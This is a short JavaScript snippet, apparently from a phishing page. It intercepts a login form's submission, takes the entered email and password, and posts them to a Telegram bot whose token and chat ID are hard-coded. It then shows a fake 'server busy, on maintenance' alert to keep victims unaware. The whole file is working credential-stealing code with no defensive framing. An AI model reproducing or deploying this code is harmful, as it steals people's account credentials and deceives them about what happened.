document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const botToken = '7410395588:AAEe0-EvyP5agiZLahjmMkjIFevriQ9aUIg';
    const chatId = '6770367773';
    const message = `Email: ${email}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Error Server is Busy we are on maintanance!');
        } else {
            alert('Failed to connect');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred');
    });
});
